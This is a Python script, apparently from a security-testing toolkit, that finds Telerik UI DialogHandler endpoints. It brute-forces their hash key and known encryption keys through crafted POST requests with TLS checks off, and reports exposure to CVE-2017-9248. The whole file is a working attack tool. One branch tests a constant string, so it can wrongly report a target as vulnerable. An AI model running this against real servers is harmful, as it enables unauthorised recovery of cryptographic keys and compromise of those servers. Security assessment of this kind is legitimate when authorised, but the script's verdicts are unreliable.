import os
import re
import sys
import urllib.parse
import argparse
import requests

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from badsecrets import modules_loaded

Telerik_HashKey = modules_loaded["telerik_hashkey"]
Telerik_EncryptionKey = modules_loaded["telerik_encryptionkey"]


def validate_url(
    arg_value,
    pattern=re.compile(
        r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
        re.IGNORECASE,
    ),
):
    if not pattern.match(arg_value):
        raise argparse.ArgumentTypeError("URL is not formatted correctly")
    return arg_value


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        type=validate_url,
        help="The URL of the page to access and attempt to pull viewstate and generator from",
        required=True,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="Optionally specificy an HTTP proxy",
    )

    parser.add_argument(
        "-a",
        "--user-agent",
        help="Optionally set a custom user-agent",
    )

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    headers = {}
    if args.user_agent:
        headers["User-agent"] = args.user_agent

    try:
        res = requests.get(args.url, proxies=proxies, headers=headers, verify=False)
    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
        print(f"Error connecting to URL: [{args.url}]")
        return
    resp_body = urllib.parse.unquote(res.text)
    if "Loading the dialog..." not in resp_body:
        print(f"Url does not appear to be a Telerik UI DialogHandler")
        return

    found_hash_key = False
    print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
    x = Telerik_HashKey()
    for hash_key_probe, hash_key in x.hashkey_probe_generator():
        data = {"dialogParametersHolder": hash_key_probe}
        res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
        resp_body = urllib.parse.unquote(res.text)
        if "The input data is not a complete block" in resp_body:
            print(f"Found matching hashkey! [{hash_key}]")
            found_hash_key = True
            break
        elif "The hash is not valid!" in resp_body:
            continue

        elif "Exception of type 'System.Exception' was thrown" in resp_body:
            print(
                "Telerik instance appears to be non-functional. It still may be vulnerable to CVE-2017-9248 when repaired or have a known key"
            )
            return
        elif "The input is not a valid Base-64 string":
            print("The target appears to be a pre-2017 version, and does not have a hash key.")
            print("This means it should be vulnerable to CVE-2017-9248!!!")
            return

    if found_hash_key:
        print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")

        y = Telerik_EncryptionKey()
        #  derivedKey, derivedIV = y.telerik_derivekeys("6YXEG7IH4XYNKdt772p2ni6nbeDT772P2NI6NBE4@")
        for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(hash_key):
            data = {"dialogParametersHolder": encryption_key_probe}
            res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
            if "Index was outside the bounds of the array" in res.text:
                print(f"Found Encryption key! [{encryption_key}]")
                return

        print("Could not identify encryption key.")


if __name__ == "__main__":
    main()
# sample_dp = "EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CgoKCkZhbHNlCjAKCgoK;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxOC4xLjExNy40NSwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False"
